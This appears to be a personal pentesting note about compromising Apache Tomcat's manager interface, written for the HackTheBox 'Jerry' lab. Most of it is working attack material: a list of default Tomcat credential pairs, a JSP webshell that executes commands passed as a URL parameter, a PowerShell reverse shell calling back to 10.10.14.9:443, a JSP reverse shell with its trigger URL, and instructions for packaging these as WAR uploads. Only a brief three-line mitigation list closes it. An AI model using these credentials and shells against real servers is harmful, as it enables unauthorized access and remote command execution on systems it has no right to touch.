
/manager/html

### default creds

admin : admin
ADMIN : ADMIN
admin : j5Brn9
admin : None
admin : tomcat
cxsdk : kdsxc
j2deployer : j2deployer
ovwebusr : OvW*busr1
QCC : QLogic66
role : changethis
role1 : role1
role1 : tomcat
root : root
tomcat : changethis
tomcat : s3cret
tomcat : tomcat
xampp : xampp

---
### file upload

a .jsp file is java code for the web, not javascript, and is run on the server side
a .war file is just a normal zip containing the .jsp, other files can be added

We can upload Web Application Resource (WAR) files

GUI Access to upload war files:
![[../../Boxes/HackTheBox/Jerry (Done) tomcat example/Images/Pasted image 20250513202248.png|1200]]

There's also api access, check it out later

---
### webshell

a war (like websh.war) file is just a normal zip containing the .jsp, like:
websh.jsp
```java
<%@page import="java.io.*, java.net.*"%>
<%
    String cmd = request.getParameter("c");
    if (cmd != null && !cmd.isEmpty()) {
        String decoded = URLDecoder.decode(cmd, "UTF-8");
        try {
            Process p = Runtime.getRuntime().exec(decoded);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            out.println("<pre>");
            while ((line = reader.readLine()) != null) {
                out.println(line.replace("<", "&lt;").replace(">", "&gt;"));
            }
            out.println("</pre>");
        } catch (Exception e) {
            out.println("<pre>" + e.toString() + "</pre>");
        }
    }
%>

```

share a ps1 revsh like:
revsh2.ps1
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
*(make sure the ip and port are replaced with yours)*

![[../../Boxes/HackTheBox/Jerry (Done) tomcat example/Images/Pasted image 20250513231155.png]]

---

We can add pther useful files to the war file:

```sh
C:\apache-tomcat-7.0.88\webapps\websh2>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\apache-tomcat-7.0.88\webapps\websh2

05/14/2025  08:12 AM    <DIR>          .
05/14/2025  08:12 AM    <DIR>          ..
05/13/2025  11:14 PM               732 websh.jsp
05/14/2025  01:08 AM               514 websh2.ps1
               2 File(s)          1,246 bytes
               2 Dir(s)   2,399,576,064 bytes free

```

---

### revshell

revsh.jsp (zipped in revsh.war):
```java
<%@ page import="java.io.*, java.net.*" %>
<%!
class StreamConnector extends Thread {
    InputStream is; OutputStream os;
    StreamConnector(InputStream is, OutputStream os) {
        this.is = is; this.os = os;
    }
    public void run() {
        try {
            BufferedReader r = new BufferedReader(new InputStreamReader(is));
            BufferedWriter w = new BufferedWriter(new OutputStreamWriter(os));
            char[] buf = new char[8192];
            int len;
            while ((len = r.read(buf)) > 0) {
                w.write(buf, 0, len);
                w.flush();
            }
        } catch (Exception ignored) {}
    }
}
%>
<%
String ip = request.getParameter("ip");
String port = request.getParameter("port");
if (ip != null && port != null) {
    try {
        Socket s = new Socket(ip, Integer.parseInt(port));
        String os = System.getProperty("os.name").toLowerCase();
        String shell = os.contains("win") ? "cmd.exe" : "/bin/bash";
        Process p = Runtime.getRuntime().exec(shell);
        new StreamConnector(p.getInputStream(), s.getOutputStream()).start();
        new StreamConnector(s.getInputStream(), p.getOutputStream()).start();
    } catch (Exception e) {
        out.println("<pre>" + e.toString() + "</pre>");
    }
}
%>
```

http://jerry.htb:8080/revsh/revsh.jsp?ip=10.10.14.9&port=443

---

### Mitigations

- up to date version of Tomcat
- disable the host manager
- use complex credentials

